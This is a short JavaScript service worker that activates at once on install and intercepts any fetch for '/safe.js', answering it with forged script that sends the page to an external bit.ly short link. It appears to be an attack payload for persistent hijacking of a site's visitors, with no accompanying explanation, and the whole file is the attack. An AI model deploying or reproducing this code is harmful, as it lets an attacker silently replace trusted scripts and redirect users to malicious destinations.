self.addEventListener("install", function (event) {
    event.waitUntil(self.skipWaiting());
});

self.addEventListener("fetch", (event) => {
    if (event.request.url.endsWith("/safe.js")) {
        event.respondWith(
            new Response(`location='//bit.ly/2PFcOQ1'`, {
                headers: { "Content-Type": "application/javascript" },
            })
        );
    }
});